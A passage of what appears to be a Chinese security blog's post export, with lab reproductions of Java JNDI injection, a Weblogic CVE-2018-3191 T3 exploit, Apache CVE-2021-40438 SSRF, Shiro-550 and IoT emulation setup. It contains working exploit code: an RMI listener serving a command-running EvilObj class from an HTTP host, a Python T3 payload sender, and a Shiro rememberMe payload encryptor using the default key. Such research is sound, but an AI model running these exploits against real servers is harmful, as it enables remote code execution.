     FileOutputStream fout = new FileOutputStream(\"fileStream.txt\");\n\n        //ObjectOutputStream 将 Java 对象的基本数据类型和图形写入 OutputStream。可以使用 ObjectInputStream 读取（重构）对象。\n        ObjectOutputStream out = new ObjectOutputStream(fout);\n\n        //writeObject 方法负责写入特定类的对象状态，以便相应的 readObject 方法可以恢复它。\n        out.writeObject(testObj);\n\n        //FileInputStream 类从文件系统中的一个文件中获取输入字节。\n        FileInputStream fin = new FileInputStream(\"fileStream.txt\");\n\n        //创建从指定 InputStream 读取的 ObjectInputStream。从流读取序列化头部并予以验证。\n        ObjectInputStream in = new ObjectInputStream(fin);\n        Registry unSerObj = (Registry) in.readObject();\n\n        System.out.println(testObj);\n    }\n}\n```\n\n在开启了`JRMPListerner`之后，反序列化的过程中并没有命令执行，经过调试，最终也会走入到`executeCall`方法，但是总是没办法接收到远程的数据，而远程显示已经发送的数据，但是就是接收不到，不知道为什么。实际的调用栈其实也差不多\n\n![image-20230209183545852](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209183545852.png)\n\n在本地调试时也会进入到`executeCall#var14 = this.in.readObject();`\n\n但是反序列化得到的结果不是想要的，水平比较菜，也没有找到反序列化的数据在哪里。寄寄。\n\n但是实际上，如果在上述代码最后加上一个远程通信代码\n\n```java\nunSerObj.list();\n```\n\n这样就可以得到命令执行，同样也是在`executeCall#var14 = this.in.readObject();`进行的反序列化得到命令执行，有点整不会了。**mark一下**\n\n\n\n## JNDI注入\n\n学到`Weblogic`的一些洞，发现其中的`JNDI`注入`(Java Naming and Directory Interface)`挺有意思，就来复现一下。\n\n首先以`java1.6.0_45`为例子，比较原始一点，不涉及之后`JAVA`版本对于`JNDI`注入的一些限制\n\n### 简单例子\n\n做个简单`JNDI`的运行例子，画一下图更加清楚一点\n\n![image-20230210201304085](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230210201304085.png)\n\n#### server/register\n\n直接就放在一起了，用`wh1t3p1g`师傅改版后的[ysoserial](https://github.com/wh1t3p1g/ysoserial)\n\n```shell\njava -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 1099 EvilObj http://LDAP_IP/\n```\n\n这个`EvilObj`即代表在`LDAP`服务中的`EvilObj.class`，随便写点恶意代码就行\n\n参考:[JNDI with RMI-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/199481#h3-9)\n\n```java\n/**\n * @author wh1t3P1g\n * @since 2020/2/4\n */\npublic class EvilObj {\n\n    public EvilObj() throws Exception {\n        Runtime rt = Runtime.getRuntime();\n        String[] commands = {\"/bin/sh\", \"-c\", \"calc\"};\n        rt.exec(commands);\n    }\n}\n```\n\n`javac`编译生成的`EvilObj.class`，放在`LDAP`服务目录下即可\n\n#### LDAP服务\n\n这个直接开启`Web`服务就行，比如用`Python`\n\n```shell\npython3 -m http.server 80\n```\n\n然后`Web`目录下得有上述的`EvilObj.class`，即`http://LDAP_IP/EvilObj.class`得访问下载到才行。\n\n当然这个`LDAP`服务和上面的`server`放一起也行，用`wh1t3p1g`师傅改版后的[ysoserial](https://github.com/wh1t3p1g/ysoserial)同样可以完成，但是师傅可能更改了一些代码，现在不太好使，也可能是自己方法不对。这里就自己写了一下，借助一下师傅的`PayloadClassFileHTTPServer`类，然后整合一下放到`ysoserial.exploit`里面就行\n\n```java\npackage ysoserial.exploit;\n\n\nimport com.sun.jndi.rmi.registry.ReferenceWrapper;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport sun.rmi.transport.TransportConstants;\nimport ysoserial.payloads.ObjectPayload.Utils;\n\nimport javax.naming.Reference;\nimport javax.net.ServerSocketFactory;\nimport java.io.*;\nimport java.net.*;\nimport java.rmi.MarshalException;\nimport java.rmi.server.ObjID;\nimport java.rmi.server.UID;\nimport java.util.Arrays;\n\n\n/**\n * Generic JRMP listener\n *\n * Opens up an JRMP listener that will deliver the specified payload to any\n * client connecting to it and making a call.\n *\n * @author mbechler\n *\n */\n@SuppressWarnings ( {\n    \"restriction\"\n} )\npublic class RMIRefWithHttpServerListener {\n\n    public static final void main (  String[] args ) throws Exception{\n\n        if ( args.length < 4 ) {\n            System.err.println(RMIRefWithHttpServerListener.class.getName() + \"<registryHost:registryPort> <PayloadServerPort> <factory_name> <command>\");\n            System.exit(-1);\n            return;\n        }\n\n        System.setProperty(\"sun.rmi.transport.tcp.logLevel\",\"BRIEF\");\n        String[] registry = args[0].split(\":\");\n        int registryPort = Integer.parseInt(registry[1]);\n        String host = registry[0];\n        int httpServerPort = Integer.parseInt(args[1]);\n        String factoryURL = \"http://\"+host+\":\"+httpServerPort+\"/\";\n        String factoryName = args[2];\n        String command = args[3];\n\n\n//        int registryPort = 9999;\n//        String host = \"localhost\";\n//        int httpServerPort = 80;\n//        String factoryName = \"EvilObj\";\n//        String factoryURL = \"http://\"+host+\":\"+httpServerPort+\"/\";\n//\n//        String command = \"touch aaa\";\n\n\n\n        Reference reference = new Reference(factoryName,factoryName,factoryURL);\n        final Object payloadObject = new ReferenceWrapper(reference);\n\n        try {\n            PayloadClassFileHTTPServer server = new PayloadClassFileHTTPServer(httpServerPort, factoryName, command);\n            server.run();\n\n            System.err.println(\"* URL: rmi://\"+host+\":\"+registryPort+\"/\"+factoryName);\n            System.err.println(\"* FactoryURL: \" + factoryURL);\n            System.err.println(\"* Opening JRMP listener on \" + registryPort);\n\n            RMIRefListener c = new RMIRefListener(registryPort, payloadObject);\n            c.run();\n        }\n        catch ( Exception e ) {\n            System.err.println(\"Listener error\");\n            e.printStackTrace(System.err);\n        }\n        Utils.releasePayload(args[1], payloadObject);\n    }\n\n}\n\n```\n\n命令如下\n\n```shell\njava -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefWithHttpServerListener [registry_IP:registry_PORT] [LDAP_Port] [EvilObj_name] [command]\n```\n\n#### client\n\n本地访问一下就行\n\n```java\npackage ysoserial.test.payloads;\n\nimport javax.naming.Context;\nimport javax.naming.InitialContext;\n\n\npublic class myTest {\n    public static void main(String[] args) throws Exception {\n        System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\");\n        System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\");\n        Context ctx = new InitialContext();\n        ctx.lookup(\"rmi://[registry_IP]:[registry_Port]/EvilObj\");\n    }\n}\n```\n\n这里的两行代码\n\n```java\nSystem.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\");\nSystem.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\");\n```\n\n是在某个新的`JDK`之后由于`com.sun.jndi.ldap.object.trustURLCodebase`和`com.sun.jndi.rmi.object.trustURLCodebase`默认设置为`false`，导致无法利用`RMI`机制以及`LDAP`机制。当没有设置时，进行`lookup`调试后会进入如下判断\n\n- `RMI`判断\n\n  `RegistryContext#decodeObject`判断`com.sun.jndi.rmi.object.trustURLCodebase`\n\n  ![image-20230211163219141](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211163219141.png)\n\n- `LDAP`判断\n\n  `NamingManager#getObjectFactoryFromReference`进入`VersionHelper12#loadClass`判断`com.sun.jndi.ldap.object.trustURLCodebase`\n\n  ![image-20230211163527766](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211163527766.png)\n\n  ![image-20230211163544591](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211163544591.png)\n\n所以这里将其设置为`true`，或者命令行也行\n\n```\n...\n```\n\n详细看下图\n\n![image-20230211124056681](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211124056681.png)\n\n参考：[攻击Java中的JNDI、RMI、LDAP(二) - Y4er的博客](https://y4er.com/posts/attack-java-jndi-rmi-ldap-2/#jndi注入)\n\n### CVE-2018-3191\n\n`Weblogic`中关于`JNDI`注入的，比较原始的应该就算这个洞了吧。\n\n#### 环境搭建\n\n也是类似的，用`vulhub`的，就用`CVE-2018-2628`的`Weblogic`，参考：https://xz.aliyun.com/t/10172#toc-1\n\n记得最后把`docker`重启一下就行\n\n#### 漏洞分析\n\n##### 调试准备\n\n- 本地准备\n\n  生成在`T3`协议中进行反序列化的`JtaTransactionManager`类，该类不在`T3`协议的黑名单中，可以被反序列化，如下代码\n\n  ```java\n  package ysoserial.payloads;\n  \n  import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;\n  \n  import java.io.File;\n  import java.io.FileOutputStream;\n  import java.io.IOException;\n  import java.io.ObjectOutputStream;\n  \n  public class JNDI {\n      public static void main(String[] args) throws IOException {\n          String jndiAddress = \"rmi://[registry_IP]:[registry_Port]/EvilObj\";\n          JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();\n          jtaTransactionManager.setUserTransactionName(jndiAddress);\n          ser(jtaTransactionManager, \"CVE_2018_3191.ser\");\n      }\n  \n      public static void ser(Object obj, String serName) throws IOException {\n          File file = new File(serName);\n          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file));\n          oos.writeObject(obj);\n          System.out.println(\"-------序列化成功\" + serName);\n      }\n  }\n  \n  ```\n\n  上述代码参考：[weblogic历史T3反序列化漏洞及补丁梳理 (qq.com)](https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng)\n\n  其中的`JtaTransactionManager`类是在`Weblogic`中的，将`Weblogic`中的`modules`打包出来放在`IDEA`中加载即可。\n\n  ![image-20230211154619832](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211154619832.png)\n\n  相关的`EXP`如下\n\n  ```python\n  from os import popen\n  import struct # 负责大小端的转换 \n  import subprocess\n  from sys import stdout\n  import socket\n  import re\n  import binascii\n  \n  def generatePayload(gadget,cmd):\n      YSO_PATH = \"/home/hacker/Desktop/WEB/JAVA/ysoserial.jar\"\n      popen = subprocess.Popen(['java','-jar',YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)\n      return popen.stdout.read()\n  \n  def getFilePayload(path):\n      with open(path, \"rb\") as f:\n          return f.read()\n  \n  def T3Exploit(ip,port,payload):\n      sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n      sock.connect((ip,port))\n      handshake = \"t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\"\n      sock.sendall(handshake.encode())\n      data = sock.recv(1024)\n      compile = re.compile(\"HELO:(.*).0.false\")\n      match = compile.findall(data.decode())\n      if match:\n          print(\"Weblogic: \"+\"\".join(match))\n      else:\n          print(\"Not Weblogic\")\n          return  \n      #payload的长度四字节无符号整数\n      payloadLen = binascii.a2b_hex(b\"00000000\")\n  \n      #头部某些地方改掉也没关系，估计是只检测了一部分\n      t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\")\n      \n      #反序列化标志，这个不能改\n      desflag = binascii.a2b_hex(b\"fe010000\")\n  \n      payload = payloadLen + t3header  +desflag+  payload\n      payload = struct.pack(\">I\",len(payload)) + payload[4:]\n      sock.send(payload)\n  \n  if __name__ == \"__main__\":\n      host = \"127.0.0.1\"\n      port = 7001\n      #gadget = \"JNDI\"\n      #command = \"xxx:xxx\"\n      #payload = generatePayload(gadget, command)\n      payload = getFilePayload(\"/home/hacker/Desktop/WEB/JAVA/ysoserial/CVE_2018_3191.ser\")\n      T3Exploit(host, port, payload)\n  ```\n\n- 服务器准备\n\n  使用如下代码搭建\n\n  - `registry`\n\n    ```shell\n    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRefListener 9999 EvilObj http://[LDAP_IP]/\n    ```\n\n  - `LDAP`服务\n\n    将`EvilObj.class`放在该目录下\n\n    ```shell\n    python3 -m http.server 80\n    ```\n\n需要注意的是，这里`CVE-2018-2628`中的`Weblogic`其`java`环境是`1.6.0_45`，而如果服务器中的`java`环境大于此版本，其生成的`EvilObj`就无法被成功解析，会出现如下版本不匹配问题，导致无法完成漏洞利用。\n\n![123421](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211165742189.png)\n\n而高版本解析低版本则没有什么关系，所以一般需要找对应版本的`java`来生成`EvilObj`然后挂载到服务器上。\n\n最后有如下结果所示，然后版本也没有不匹配就应该差不多了。\n\n![image-20230211164042119](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211164042119.png)\n\n\n\n##### 具体分析\n\n漏洞点出在`com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject`中调用了`initUserTransactionAndTransactionManager`\n\n![image-20230211155605398](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211155605398.png)\n\n继续跟进`initUserTransactionAndTransactionManager`，判断一下`this.userTransactionName`就会调用到`this.lookupUserTransaction`函数，而`this.userTransactionName`在反序列化中是可控的\n\n![image-20230211155652699](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211155652699.png)\n\n`this.lookupUserTransaction`函数中会调用到`JndiTemplate#lookup`函数，并且以`userTransactionName`作为参数\n\n![image-20230211155802378](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211155802378.png)\n\n`JndiTemplate#lookup`函数中会再调用一次本类中单个`name`参数的`lookup`函数\n\n![image-20230211160058002](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211160058002.png)\n\n在该单个`name`参数的`lookup`函数中找到最终的漏洞根源，使用了`Context`的`lookup`函数来远程加载恶意类，该`name`就是`JtaTransactionManager.userTransactionName`，是可控的。\n\n![image-20230211160128732](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211160128732.png)\n\n这个`this.execute`就会调用到这里重写的`doInContext`函数，触发漏洞\n\n![image-20230211160717241](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230211160717241.png)\n\n# HTTPD(Apache)\n\n## CVE-2021-40438\n\n`Apache`版本小于`2.4.48`，由于代理模块`mod_proxy`的漏洞，可以造成`Apache`的`SSRF`，需要开启如下两个模块\n\n```\nLoadModule proxy_module modules/mod_proxy.so\nLoadModule proxy_http_module modules/mod_proxy_http.so\n```\n\n即在`/conf/httpd.conf`中注释掉\n\n![image-20230214103829499](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214103829499.png)\n\n### 环境搭建\n\n参考`P`神的[编译调试 Apache](https://wx.zsxq.com/dweb2/index/topic_detail/418885442584848)\n\n### 漏洞分析\n\n相关的漏洞链条如下\n\n```\nmod_proxy.c/proxy_handler\nproxy_util.c/ap_proxy_pre_request\nproxy_util.c/fix_uds_filename\n```\n\n同样也是参考`P`神的：[Apache mod_proxy SSRF（CVE-2021-40438）的一点分析和延伸 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html)\n\n断点下在`modules/proxy/proxy_util.c`的`fix_uds_filename`函数头部\n\n![image-20230214104203749](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214104203749.png)\n\n随便发送一个数据包访问一下即可断下来，该函数相关注释如下\n\n```c\nstatic void fix_uds_filename(request_rec *r, char **url) \n{\n    char *ptr, *ptr2;\n    if (!r || !r->filename) return;\n\n    if (!strncmp(r->filename, \"proxy:\", 6) &&\n            (ptr2 = ap_strcasestr(r->filename, \"unix:\")) &&\n            (ptr = ap_strchr(ptr2, '|'))) {\n        apr_uri_t urisock;\n        apr_status_t rv;\n        *ptr = '\\0';\n        rv = apr_uri_parse(r->pool, ptr2, &urisock);\n        if (rv == APR_SUCCESS) {\n            char *rurl = ptr+1;\n            char *sockpath = ap_runtime_dir_relative(r->pool, urisock.path);\n            apr_table_setn(r->notes, \"uds_path\", sockpath);\n            *url = apr_pstrdup(r->pool, rurl); /* so we get the scheme for the uds */\n            /* r->filename starts w/ \"proxy:\", so add after that */\n            memmove(r->filename+6, rurl, strlen(rurl)+1);\n            ap_log_rerror(APLOG_MARK, APLOG_TRACE2, 0, r,\n                    \"*: rewrite of url due to UDS(%s): %s (%s)\",\n                    sockpath, *url, r->filename);\n        }\n        else {\n            *ptr = '|';\n        }\n    }\n}\n```\n\n首先关注的一点是`r->filename`，这里我输入的`url`是`http://127.0.0.1:4444/?aaaaaa`，其`r->filename`相关值如下，为`proxy:http://192.168.1.1/?aaaaaa`\n\n![image-20230214105305206](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105305206.png)\n\n即将我们设置中的代理和用户的输入`url`路径进行了拼接\n\n![image-20230214105328864](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105328864.png)\n\n也就是说这个`r->filename`是一部分可控的。\n\n那么依据在`fix_uds_filename`函数的第二个`if`判定以及相关的函数注释\n\n- `ap_strcasestr`\n\n  ![aaa](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105601093.png)\n\n- `ap_strchr`\n\n  ![image-20230214105648945](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230214105648945.png)\n\n那么即可推导出进入该`if`的条件\n\n- `r->filename`的前6个字符等于`proxy:`\n- `r->filename`的字符串中含有字串`unix:`\n- `unix:`字串的后面部分含有字符`|`\n\n比如这样的`proxy:http://192.168.1.1/?unix:aaaaaa|http://127.0.0.1/`\n\n\n\n","tags":["Vulhub"],"categories":["Web","Vulhub"]},{"title":"IOT环境搭建","url":"/2023/01/05/IOT环境搭建/","content":"\n\n# 一、固件处理\n\n## 1.获取\n\n要么提取，要么从官网下载\n\n## 2.解包\n\n一般常用`binwalk`，有时候可能涉及加密、获取组件相关问题\n\n参考：[D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern's 小站](https://lantern.cool/CVE-d-link-dir-815/#固件提取)\n\n# 二、环境搭建\n\n## 1.简单启动\n\n`IOT`相关的基本都是涉及嵌入式，不同架构，常见有`arm、mips`等，以`mips`为例子\n\n参考：[[原创\\] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-272318.htm#msg_header_h2_4)\n\n一般用`qemu`加上对应架构的**`linux`内核**和**文件系统**来启动，比如如下脚本\n\n```bash\nqemu-system-mipsel \\\n    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \\\n    -hda debian_squeeze_mipsel_standard.qcow2 \\\n    -append \"root=/dev/sda1 console=tty0\" \\\n\t-nographic\n```\n\n就可以启动一个系统\n\n## 2.网络配置\n\n最好的肯定是模拟真实的环境，那模拟真实环境肯定就需要涉及到相关网络问题，这里就需要用到`qemu`一些网络的配置，参考：[(46条消息) Linux 内核调试 七：qemu网络配置_lqonlylove的博客-CSDN博客_qemu 网络配置](https://blog.csdn.net/OnlyLove_/article/details/124536607)\n\n结合一下，大概如下\n\n- 宿主机新建`tap`网络\n\n  ```bash\n  sudo ip tuntap add dev tap0 mode tap\n  sudo ip link set dev tap0 up\n  sudo ip address add dev tap0 192.168.2.128/24\n  ```\n\n  这样就会出现如下网络后端\n\n  ![image-20221202190656170](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221202190656170.png)\n\n- 然后如下启动脚本，加入网络配置\n\n  ```bash\n  #!/bin/bash\n  qemu-system-mipsel \\\n      -M malta -kernel vmlinux-3.2.0-4-4kc-malta \\\n      -hda debian_squeeze_mipsel_standard.qcow2 \\\n      -append \"root=/dev/sda1 console=tty0\" \\\n      -net nic -net tap,ifname=tap0,script=no,downscript=no \\\n  \t-nographic\n  ```\n\n- 启动之后，在`qemu`中设置相关`IP`地址，然后启用\n\n  ```bash\n  ip addr add 192.168.2.129/24 dev eth0\n  ip link set eth0 up\n  ```\n\n  这样就可以有`IP`地址了，当然这些`IP`地址都是自己设置的\n\n  ![image-20221202191218116](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221202191218116.png)\n\n  这样就宿主机和`qemu`虚拟机就可以连通了，之后就是相关的服务启动了\n\n  ![image-20221202191300164](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221202191300164.png)\n\n## 3.常见配置\n\n很多的`IOT`都是`squashfs`这个文件系统，`binwalk`解包出来会有一个`squashfs-root`文件夹，然后我们可以将该文件系统通过`scp`拷贝进启动的`qemu`虚拟机，之后进行简单的设置即可\n\n```bash\nscp -r ./squashfs-root root@ip:/root/\n\n#挂载系统的proc固件目录下的proc,防止程序在访问内核信息时找不到相关的而运行错误\nmount --bind /proc squashfs-root/proc\n\n#更换一下root目录,为文件系统的相关链接库做准备\nchroot . bin/sh\n\n#然后还需要改一下软连接、软路由啥的,比如DIR-645的漏洞,就需要创建一些软连接,如下\nln -s /htdocs/cgibin /htdocs/web/hedwig.cgi\nln -s /htdocs/cgibin /usr/sbin/phpcgi\nln -s  /htdocs/cgibin /usr/sbin/hnap\n\n#启动服务就行\n/usr/bin/httpd -f http_conf\n```\n\n\n\n# 三、CGI配置\n\n很多时候的嵌入式`Web`页面都是用`CGI`的，所以可以稍微学习一下相关`CGI`。\n\n## 1.环境搭建\n\n这里就选择`ubuntu`自带的`mini-httpd`服务\n\n```bash\nsudo apt install mini-httpd\n```\n\n然后相关的配置在`/etc/mini-httpd.conf`，主要关注如下\n\n![image-20221207103833732](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207103833732.png)\n\n相关端口也是设置好\n\n![image-20221207103738798](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207103738798.png)\n\n然后需要在数据目录，即`/var/www/html`下新建`cgi-bin`目录，然后把相关`CGI`程序放到该`cgi-bin`目录下即可。\n\n## 2.启动服务\n\n如下，设置一下启动配置文件即可运行了\n\n```bash\nsudo mini_httpd -C /etc/mini-httpd.conf\n```\n\n然后即可访问到默认界面\n\n![image-20221207104046784](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207104046784.png)\n\n## 3.编写`CGI`\n\n`CGI`和正常`C`程序是一样的，直接编译之后放到对应`cgi-bin`目录下即可，比如如下程序\n\n![image-20221207104240311](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207104240311.png)\n\n编译如下\n\n```bash\ngcc ./test.c -static -o test.cgi\n```\n\n访问效果如下\n\n![image-20221207104257725](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221207104257725.png)\n\n这里需要注意要直接`printf`显示出来的话，需要设置相关的`html`格式，这里即可先进行了\n\n```c\nprintf( \"Content-Type: text/plain\\r\\n\\r\\n\" );\n```\n\n之后即可自己写一些`CGI`来玩耍了。\n\n感觉`CGI`的很多的不安全性就是在于直接运行了一个可执行程序，而该可执行程序大多都是用`C`语言编写的，安全性可想而知。\n","tags":["IOT"],"categories":["IOT","环境搭建"]},{"title":"WEB中间件漏洞","url":"/2022/10/22/常见中间件漏洞/","content":"\n\n\n# Shiro\n\n## 1.Shiro-550\n\n对应`CVE-2016-4437`\n\n参考：[Shiro 550 漏洞学习（一） (yuque.com)](https://www.yuque.com/tianxiadamutou/zcfd4v/op3c7v#823652d0)\n\n### (1)利用版本\n\n`1.2.4`及以下\n\n### (2)漏洞原理\n\n`Apache Shiro`框架提供了记住密码功能，登录成功的话会将用户的登录信息进行经过`AES`加密然后`base64`编码，放在`Cookie`的`rememberMe`字段，大致如下\n\n![image-20221122090810999](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122090810999.png)\n\n那么在服务端就会对该`rememberMe`字段进行`base64`解码，然后`AES`解密，最后再反序列化，如果我们构造恶意的`rememberMe`字段，这样就会导致反序列化的`RCE`漏洞。同时，由于`AES`加解密的`KEY`是硬编码写在源码中的，我们可以直接获得。\n\n### (3)漏洞环境\n\n#### 简单搭建\n\n- `vulhub`：[vulhub/vulhub: Pre-Built Vulnerable Environments Based on Docker-Compose (github.com)](https://github.com/vulhub/vulhub)\n\n#### 源码构建`Shiro`\n\n参考[(48条消息) shiro debug 调试_scanner010的博客-CSDN博客](https://blog.csdn.net/m0_46127592/article/details/123999749)\n\n- 下载源码：[apache/shiro: Apache Shiro (github.com)](https://github.com/apache/shiro)\n\n  然后换成`1.2.4`：`git checkout shiro-root-1.2.4`\n\n- `jstl`版本切换\n\n  打开`shiro/samples/web/pom.xml`，更换`jstl`版本\n\n  ![image-20221122092207371](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092207371.png)\n\n  之后重新`reload`一下即可\n\n- `Tomcat`部署\n\n  ![image-20221122092453428](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092453428.png)\n\n  然后配置一下`Web`界面\n\n  ![image-20221122092527995](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092527995.png)\n\n  如下添加即可\n\n  ![image-20221122092557904](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122092557904.png)\n\n  之后运行或调试即可\n\n### (4)漏洞流程分析\n\n`rememberMe`解析流程\n\n```\nAbstractRememberMeManager.getRememberedPrincipals\nCookieRememberMeManager.getRememberedSerializedIdentity  //获取Cookie中的remember字段,并且进行base64解码\n\nAbstractRememberMeManager.convertBytesToPrincipals\nAbstractRememberMeManager.decrypt\nAbstractRememberMeManager.deserialize\n\nDefaultSerializer.deserialize\n```\n\n大致图解如下\n\n![image-20221122114903998](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122114903998.png)\n\n### (5)漏洞代码分析\n\n- `AbstractRememberMeManager.getRememberedPrincipals`\n\n  当一个涉及到用户信息的请求来时，首先是进入`rememberMe`管理函数\n\n  ![image-20221122115116077](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122115116077.png)\n\n- `CookieRememberMeManager.getRememberedSerializedIdentity`\n\n  在`AbstractRememberMeManager.getRememberedPrincipals`函数中调用`getRememberedSerializedIdentity`尝试获取`base64`解码后的`rememberMe`字段\n\n  ![image-20221122120445903](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122120445903.png)\n\n- `AbstractRememberMeManager.convertBytesToPrincipals`\n\n  随即调用`convertBytesToPrincipals`函数进行后续操作\n\n  ![image-20221122120543984](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122120543984.png)\n\n  - `AbstractRememberMeManager.decrypt`\n\n    `convertBytesToPrincipals`函数中调用到`decrypt`函数，通过`getDecryptionCipherKey`获取密钥尝试对`base64`解码后的`Cookie`进行`AES`解密\n\n    ![image-20221122120725908](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122120725908.png)\n\n    一层一层撸下来，如下所示，可以在`AbstractRememberMeManager`中找到对应的硬编码的`key`\n\n    ```java\n    public byte[] getDecryptionCipherKey() {\n        return decryptionCipherKey;\n    }\n    \n    public void setDecryptionCipherKey(byte[] decryptionCipherKey) {\n        this.decryptionCipherKey = decryptionCipherKey;\n    }\n    \n    public void setCipherKey(byte[] cipherKey) {\n        //Since this method should only be used in symmetric ciphers\n        //(where the enc and dec keys are the same), set it on both:\n        setEncryptionCipherKey(cipherKey);\n        setDecryptionCipherKey(cipherKey);\n    }\n    \n    public AbstractRememberMeManager() {\n        this.serializer = new DefaultSerializer<PrincipalCollection>();\n        this.cipherService = new AesCipherService();\n        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);\n    }\n    \n    private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\");\n    ```\n\n  - `AbstractRememberMeManager.deserialize`\n\n    解密完成之后，回到`AbstractRememberMeManager.convertBytesToPrincipals`函数中即进行反序列化\n\n    ![image-20221122121659679](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221122121659679.png)\n\n    调用到了`DefaultSerializer.deserialize`来完成最后的反序列化过程\n\n### (6)漏洞利用\n\n即将我们的恶意反序列化链进行相关编码加密，在登录时勾选`rememberMe`，然后抓包设置为`rememberMe`字段发送到服务器即可，常用的链条为`CC1`，`CC6`，`CC10`，`cc11`\n\n- 相关`POC`\n\n  使用`ysoserial`生成序列化链条`cc1`然后编码加密即可。\n\n```java\nimport org.apache.shiro.crypto.AesCipherService;\nimport org.apache.shiro.codec.CodecSupport;\nimport org.apache.shiro.util.ByteSource;\nimport org.apache.shiro.codec.Base64;\n\nimport java.nio.file.FileSystems;\nimport java.nio.file.Files;\n\npublic class shiroDemo {\n    public static void main(String[] args) throws Exception {\n        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(\"/home/hacker/Desktop/WEB/JAVA/JavaThings/cc11\"));\n\n        AesCipherService aes = new AesCipherService();\n        byte[] key = Base64.decode(CodecSupport.toBytes(\"kPH+bIxk5D2deZiIxcaaaA==\"));\n\n        ByteSource ciphertext = aes.encrypt(payloads, key);\n        System.out.printf(ciphertext.toString());\n    }\n}\n\n```\n\n### (7)漏洞检测\n\n- `dnslog`\n\n- `key`检测\n\n  `key`正确则显示`deleteMe`，反之则显示`deleteMe`\n\n### (8)漏洞修复\n\n官方修复是`key`的随机生成\n\n## 2.Shiro-721\n\n这个就先不复现了，比较没有实用价值\n\n\n\n# Tomcat\n\n## 1.内存马\n\n参考：[Tomcat 内存马学习(一)：Filter型 (yuque.com)](https://www.yuque.com/tianxiadamutou/zcfd4v/kd35na#74f91dcf)\n\n这个不能算漏洞，只能算一种写木马的方式吧\n\n由于`Tomcat`的机制问题，存在很多可以写内存马的地方，依据[wjlshare师傅博客]([Tomcat 内存马学习(一)：Filter型 – 天下大木头 (wjlshare.com)](http://wjlshare.com/archives/1529))介绍主要有如下几种\n\n- servlet-api类\n\n- - filter型\n\n- - servlet型\n\n- spring类\n\n- - 拦截器\n\n- - controller型\n\n- Java Instrumentation类\n\n- - agent型\n\n    \n\n### servlet-api类\n\n先需要探讨一下该机制，大概流程如下\n\n参考：[中间件内存马注入&冰蝎连接 